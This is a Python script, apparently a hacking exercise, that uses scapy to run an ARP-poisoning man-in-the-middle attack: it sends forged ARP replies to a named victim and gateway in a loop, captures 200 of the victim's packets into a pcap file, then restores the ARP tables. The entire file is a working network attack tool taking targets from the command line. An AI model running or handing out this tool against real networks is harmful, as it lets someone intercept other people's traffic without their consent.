from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr,
                       send, sniff, sndrcv, srp, wrpcap)

import os
import sys
import time

def get_mac(targetip):
    # Create an ARP request packet to get the MAC address
    # corresponding to a given IP address
    packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op='who-has', pdst=targetip)
    
    # Send the ARP request and receive the response
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    
    # Iterate through the response packets
    for _, r in resp:
        # Return the MAC address from the first response packet
        return r[Ether].src
    
    # If no response, return None
    return None

class Arper:
    def __init__(self, victim, gateway, interface='eth0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        print(f'Initialized interface {interface}:')
        print(f'Gateway ({gateway}) has MAC address: {self.gatewaymac}.')
        print(f'Victim ({victim}) has MAC address: {self.victimmac}.')
        print('-'*30)
    
    def run(self):
        # Initialize ARP buffor for infection
        self.poison_thread = Process(target=self.poison)
        # Start the poison process
        self.poison_thread.start()

        # Initialize the sniffer to observer the attack
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        # Create an ARP packet to poison the victim
        poison_victim = ARP()
        poison_victim.op = 2  # ARP reply
        poison_victim.psrc = self.gateway  # Gateway IP
        poison_victim.pdst = self.victim  # Victim IP
        poison_victim.hwdst = self.victimmac  # Victim MAC address

         # Print details of the ARP packet targeting the victim
        print(f'Source IP address: {poison_victim.psrc}')
        print(f'Target IP address: {poison_victim.pdst}')
        print(f'Source MAC address: {poison_victim.hwsrc}')
        print(f'Target MAC address: {poison_victim.hwdst}')
        print(poison_victim.summary())
        print('-'*30)

        # Create an ARP packet to poison the gateway
        poison_gateway = ARP()
        poison_gateway.op = 2  # ARP reply
        poison_gateway.psrc = self.victim  # Victim IP
        poison_gateway.pdst = self.gateway  # Gateway IP
        poison_gateway.hwdst = self.gatewaymac  # Gateway MAC address

         # Print details of the ARP packet targeting the gateway
        print(f'Source IP address: {poison_gateway.psrc}')
        print(f'Target IP address: {poison_gateway.pdst}')
        print(f'Source MAC address: {poison_gateway.hwsrc}')
        print(f'Target MAC address: {poison_gateway.hwdst}')
        print(poison_gateway.summary())
        print('-'*30)

        # Start the ARP poisoning attack
        print(f'Start ARP infection (press Ctrl + C to STOP)')
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                # Send the ARP packets
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                # Restore the network on KeyboardInterrupt
                self.restore()
                sys.exit()
            else:
                time.sleep(2)


    def sniff(self, count=200):
        time.sleep(5)
        print(f'Number of taken packets: {count}')
        bpf_filter = "ip host %s" % victim
        packets = sniff(count = count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print('Packets taken')
        self.restore()
        self.poison_thread.terminate()
        print('End')

    def restore(self):
        print('restore ARP tables...')
        send(ARP(
                op = 2,
                psrc=self.gateway,
                hwsrc=self.gatewaymac,
                pdst=self.victim,
                hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)
        send(ARP(
                op=2,
                psrc=self.victim,
                hwsrc=self.victimmac,
                pdst=self.gateway,
                hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)

if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()